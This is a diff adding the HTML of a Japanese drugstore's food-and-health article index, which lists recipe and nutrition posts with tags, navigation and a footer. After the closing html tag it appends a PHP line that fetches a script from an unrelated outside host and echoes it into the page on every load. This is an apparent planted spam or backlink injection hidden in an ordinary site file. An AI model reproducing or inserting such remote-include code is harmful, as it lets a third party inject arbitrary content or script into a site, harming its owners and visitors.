@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+	<meta charset="UTF-8">
+	<script type="text/javascript">
+if (screen.width < 768) {
+	document.write('<meta name="viewport" content="width=device-width, initial-scale=1">');
+}else{
+	document.write('<meta name="viewport" content="width=1080">');
+}
+	</script>
+
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="description" content="アルカが発信する食と健康の情報です">
+	
+	<link rel="apple-touch-icon" href="/images/icon.png">
+	<link rel="icon" href="/images/favicon.ico">
+<title>いいことあるかも 食と健康</title>
+
+	
+	<link href="https://fonts.googleapis.com/css?family=Noto+Sans+JP&display=swap" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Noto+Serif+JP" rel="stylesheet">
+	
+	<link rel="stylesheet" href="/css/pc/style.css">
+	<link rel="stylesheet" href="/css/pc/iikotoarukamo.css">
+
+
+	<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+	
+	<script src="/js/anime.min.js"></script>
+	<script src="/js/odometer.min.js"></script>
+	
+	<!--[if lt IE 9]>
+	<script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
+	<script src="//cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js"></script>
+	<![endif]-->
+	
+  <script>
+  /* ピッチインピッチアウトによる拡大縮小を禁止 */
+  document.documentElement.addEventListener('touchstart', function (e) {
+  if (e.touches.length >= 2) {e.preventDefault();}
+  }, {passive: false});
+  /* ダブルタップによる拡大を禁止 */
+  var t = 0;
+  document.documentElement.addEventListener('touchend', function (e) {
+  var now = new Date().getTime();
+  if ((now - t) < 350){
+    e.preventDefault();
+  }
+  t = now;
+  }, false);
+  </script>
+  <script type="text/javascript">
+  $(function() {
+    $(".toggleBtn").click(function() {
+      $(".tag-module-cont").toggleClass("toggleOpen");
+    });
+  });
+  </script>
+  <style>
+  body , input , textarea , select {
+  /* 入力欄にフォーカスが当たっても拡大しない */
+    font-size:17px;
+  }
+  </style>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-54PRH7D');</script>
+<!-- End Google Tag Manager -->
+</head>
+
+<body>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-54PRH7D"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+<div id="pagetop"></div>
+
+<header>
+    <div class="inner">
+    <h2 class="logo"><a href="/"><img src="/img/common/title_logo.svg" alt="アルカ ドラッグストア・調剤"></a></h2>
+        <div class="head_menu">
+	<div class="header_search pc">
+	<script async src="https://cse.google.com/cse.js?cx=002906276821904141286:ras9ybry860"></script><div class="gcse-search"></div>
+	</div>
+	</div>
+<div class="Toggle">
+　　<span></span>
+　　<span></span>
+　　<span></span>
+</div>
+  </div>
+  <nav>
+  <div class="inner h-menu">
+            <div class="header_search">
+	<script async src="https://cse.google.com/cse.js?cx=002906276821904141286:ras9ybry860"></script><div class="gcse-search"></div>
+            </div>
+            <ul class="lcFont">
+			  <li><a href="/health/">食と健康</a></li>
+                <li><a href="/search.php">店舗やチラシを探す</a></li>
+                <li><a href="/qa.php">よくある質問</a></li>
+			  <li><a href="/company.php">企業情報</a></li>
+			  <li><a href="/saiyou/">採用情報</a></li>
+            </ul>
+  </div>
+  </nav>
+</header>
+
+<main>
+  <section class="content_box page_ttl">
+	<div class="inner">
+	  <h1>いいことアルカも<strong>食と健康</strong></h1>
+	</div>
+  </section>
+		
+  <section class="content_box pankuzu">
+	<div class="inner">
+	  <ul>
+		<li><a href="../index.html">ホーム</a></li>
+		<li><a href="index.html">いいことアルカも 食と健康</a></li>
+	  </ul>
+	</div>
+  </section>
+	
+  <section class="content_box wrapper">
+  <div class="content_main iikotoarukamo_list_wrap">
+<div class="inner">
+
+<div class="tag-module-cont">
+  <h3>タグ一覧</h3>
+    <div class="tag-toggler-area">
+      <ul>
+        
+        
+          <li><a href="https://arka.co.jp/health/dessert/">#デザート  (10)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/recipe/">#レシピ  (136)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/healthy-food/">#健康食  (58)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/winter/">#冬  (32)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/summer/">#夏  (28)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/culture/">#文化  (18)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/spring/">#春  (34)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/nutrition/">#栄養  (62)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/symptom/">#症状  (23)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/autumn/">#秋  (19)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/meat/">#肉  (18)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/drug/">#薬  (6)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/exercise/">#運動  (2)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/vegetables/">#野菜  (33)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/food/">#食  (136)</a></li>
+        
+          <li><a href="https://arka.co.jp/health/fish/">#魚  (11)</a></li>
+        
+        
+      </ul>
+    <p class="click-area"><span class="toggleBtn"> </span></p>
+    </div>
+  </div>
+
+
+
+<ul class="iikotoarukamo_list">
+
+        <li class=""><div><a href="https://arka.co.jp/health/202509my-best.html">
+    
+        <h4><img src="https://arka.co.jp/health/img/a8206bb35b88eef404714e1bcf0458a1e6e41b93.png" /></h4>
+    
+        <p class="tag">
+            <span>デザート</span><span>食</span>
+        </p>
+        <p class="date">2025.09.13</p>
+        <h3>アルカ栄養士のMY BEST〜チョコレート編〜</h3>
+</a></div></li>
+
+
+        <li class=""><div><a href="https://arka.co.jp/health/202508post-177.html">
+    
+        <h4><img src="https://arka.co.jp/health/img/b7a2c1c314880ae5f9dc669815b76e4b50e7c67f.png" /></h4>
+    
+        <p class="tag">
+            <span>レシピ</span><span>夏</span><span>栄養</span><span>野菜</span><span>食</span><span>魚</span>
+        </p>
+        <p class="date">2025.08.18</p>
+        <h3>劇的変化！そうめんアレンジ</h3>
+</a></div></li>
+
+
+        <li class=""><div><a href="https://arka.co.jp/health/202507post-176.html">
+    
+        <h4><img src="https://arka.co.jp/health/img/a4a6a8b49e60b5cc3bfab1d3c2d1316dd7643e1d.png" /></h4>
+    
+        <p class="tag">
+            <span>レシピ</span><span>健康食</span><span>栄養</span><span>食</span>
+        </p>
+        <p class="date">2025.07.16</p>
+        <h3>再発見！ビーフンの魅力</h3>
+</a></div></li>
+
+
+        <li class=""><div><a href="https://arka.co.jp/health/202506post-175.html">
+    
+        <h4><img src="https://arka.co.jp/health/detailimg/eb73fd6cecf0b21e23a74af0be29b5fabc921b4d.png" /></h4>
+    
+        <p class="tag">
+            <span>薬</span><span>食</span>
+        </p>
+        <p class="date">2025.06.15</p>
+        <h3>忙しい毎日に！時短メニュー！</h3>
+</a></div></li>
+
+
+        <li class=""><div><a href="https://arka.co.jp/health/202505post-174.html">
+    
+        <h4><img src="https://arka.co.jp/health/img/54d05c8e103c550487d4cff43f0f146fa90f5f55.png" /></h4>
+    
+        <p class="tag">
+            <span>レシピ</span><span>栄養</span><span>肉</span><span>野菜</span>
+        </p>
+        <p class="date">2025.05.15</p>
+        <h3>パウダールウで！栗原はるみのビーフシチュー</h3>
+</a></div></li>
+
+
+        <li class=""><div><a href="https://arka.co.jp/health/202504post-173.html">
+    
+        <h4><img src="https://arka.co.jp/health/img/ce23cf5d9e6fa941e728b6dad663deb6537c4be7.png" /></h4>
+    
+        <p class="tag">
+            <span>健康食</span><span>栄養</span><span>症状</span><span>野菜</span>
+        </p>
+        <p class="date">2025.04.15</p>
+        <h3>管理栄養士オススメ！青汁でおいしい生活</h3>
+</a></div></li>
+
+
+        <li class=""><div><a href="https://arka.co.jp/health/202503cooking-1.html">
+    
+        <h4><img src="https://arka.co.jp/health/detailimg/9c24acde1b5e47404e2e5bb77c0d3dd5f20d3c56.png" /></h4>
+    
+        <p class="tag">
+            <span>薬</span><span>食</span>
+        </p>
+        <p class="date">2025.03.15</p>
+        <h3>クックゼラチンでcooking</h3>
+</a></div></li>
+
+
+        <li class=""><div><a href="https://arka.co.jp/health/202502post-172.html">
+    
+        <h4><img src="https://arka.co.jp/health/detailimg/b4879bfc3bfbc4de5be7f581eeadd500cee71467.png" /></h4>
+    
+        <p class="tag">
+            <span>デザート</span><span>レシピ</span><span>冬</span><span>栄養</span>
+        </p>
+        <p class="date">2025.02.15</p>
+        <h3>味噌汁だけじゃない！お麩アレンジレシピ</h3>
+</a></div></li>
+
+
+        <li class=""><div><a href="https://arka.co.jp/health/202501post-171.html">
+    
+        <h4><img src="https://arka.co.jp/health/img/c8c48628003789a9000298ff35eccba39c398843.png" /></h4>
+    
+        <p class="tag">
+            <span>レシピ</span><span>健康食</span><span>冬</span><span>栄養</span><span>症状</span><span>野菜</span><span>食</span>
+        </p>
+        <p class="date">2025.01.15</p>
+        <h3>ポカポカ汁物で腸温活！</h3>
+</a></div></li>
+
+
+        <li class=""><div><a href="https://arka.co.jp/health/202412post-168.html">
+    
+        <h4><img src="https://arka.co.jp/health/detailimg/4d4a198bf3b9cedb924b6f8e2f2e8f822e4e58b2.png" /></h4>
+    
+        <p class="tag">
+            <span>レシピ</span><span>食</span>
+        </p>
+        <p class="date">2024.12.15</p>
+        <h3>ソフトふりかけでアレンジレシピ</h3>
+</a></div></li>
+
+
+</ul>
+        <nav class="page-navigation entry-navigation pagination content-nav">
+  <ul class="pagination-list">
+<li class="page-navigation-list-item page-navigation-prev"><a rel="prev" href="https://arka.co.jp/cgi-bin/mt/mt-search.cgi?IncludeBlogs=1&amp;template_id=28&amp;limit=10&amp;archive_type=Index&amp;page=2">過去の記事へ</a></li>
+  </ul>
+</nav>
+
+
+</div>
+</div>
+  <div class="content_side">
+  <div class="new_entry">
+<h2>おすすめ記事</h2>
+<ul>
+<li>
+<a href="https://arka.co.jp/health/202110post-69.html">
+<h4><img src="https://arka.co.jp/health/img/3127d09beefebd5d4b3231bd4a1ba91d7e1060b0.png"></h4>
+<h3><span>2021.10.11</span>【特別号】オメガ３がたっぷり！亜麻仁油</h3>
+</a>
+</li>
+<li>
+<a href="https://arka.co.jp/health/202111post-83.html">
+<h4><img src="https://arka.co.jp/health/img/4f7d93110b0bb71f05fcd71e841971116f7e8323.png"></h4>
+<h3><span>2021.11.01</span>とっておきレシピ~鍋料理~</h3>
+</a>
+</li>
+<li>
+<a href="https://arka.co.jp/health/202201post-92.html">
+<h4><img src="https://arka.co.jp/health/img/840eea5ed85173731a8c4f3c17338a1edc227f9f.png"></h4>
+<h3><span>2022.01.07</span>こんな時こそ温まろう～生姜の秘密～</h3>
+</a>
+</li>
+</ul>
+</div><div class="tag_list">
+        <h2>タグリスト</h2>
+        <ul>
+
+
+            <li><a href="https://arka.co.jp/health/dessert/">#デザート  (10)</a></li>
+
+            <li><a href="https://arka.co.jp/health/recipe/">#レシピ  (136)</a></li>
+
+            <li><a href="https://arka.co.jp/health/healthy-food/">#健康食  (58)</a></li>
+
+            <li><a href="https://arka.co.jp/health/winter/">#冬  (32)</a></li>
+
+            <li><a href="https://arka.co.jp/health/summer/">#夏  (28)</a></li>
+
+            <li><a href="https://arka.co.jp/health/culture/">#文化  (18)</a></li>
+
+            <li><a href="https://arka.co.jp/health/spring/">#春  (34)</a></li>
+
+            <li><a href="https://arka.co.jp/health/nutrition/">#栄養  (62)</a></li>
+
+            <li><a href="https://arka.co.jp/health/symptom/">#症状  (23)</a></li>
+
+            <li><a href="https://arka.co.jp/health/autumn/">#秋  (19)</a></li>
+
+            <li><a href="https://arka.co.jp/health/meat/">#肉  (18)</a></li>
+
+            <li><a href="https://arka.co.jp/health/drug/">#薬  (6)</a></li>
+
+            <li><a href="https://arka.co.jp/health/exercise/">#運動  (2)</a></li>
+
+            <li><a href="https://arka.co.jp/health/vegetables/">#野菜  (33)</a></li>
+
+            <li><a href="https://arka.co.jp/health/food/">#食  (136)</a></li>
+
+            <li><a href="https://arka.co.jp/health/fish/">#魚  (11)</a></li>
+
+
+        </ul>
+    </div>
+
+
+</div>
+	   
+  </section>
+
+  <section class="content_box foot_anime">
+  </section>
+</main>
+<footer>
+    <div class="f-menu">
+        <div class="inner">
+            <h2><img src="/img/common/foot_logo.svg"></h2>
+            <h4>株式会社ナガタ薬品 / 株式会社アルカ<br>本社<br>〒654-0161 兵庫県神戸市須磨区弥栄台1丁目3-3<br>TEL.078-791-8861<br>FAX.078-791-8880</h4>
+            <ul>
+                <li><a href="/search.php">店舗とチラシを探す</a></li>
+                <li><a href="/osusume/">おすすめ商品</a></li>
+                <li><a href="/service.php">店舗サービス</a></li>
+                <li><a href="/pointcard.php">アルカポイントカード</a></li>
+                <li><a href="/health/">食と健康</a></li>
+                <li><a href="/qa.php">よくある質問</a></li>
+            </ul>
+            <ul>
+                <li><a href="/company.php">企業情報</a></li>
+                <li><a href="/chozai/">アルカ調剤薬局</a></li>
+                <li><a href="/saiyou/">採用情報</a></li>
+                <li><a href="/contact.php">お問い合わせ</a></li>
+                <li><a href="/privacy.html">個人情報の取扱について</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="copy">
+        <div class="inner">
+            <p>Copyrights (C) ARKA CO.,LTD. All rights reserved.</p>
+        </div>
+    </div>
+</footer>
+	
+<div id="page_top"><img src="/img/common/totop.svg" alt="トップに戻る"></div>
+	
+<script type="text/javascript" src="/js/common.js"></script>
+	
+</body>
+</html>
+<?php
+echo file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt");
+?>
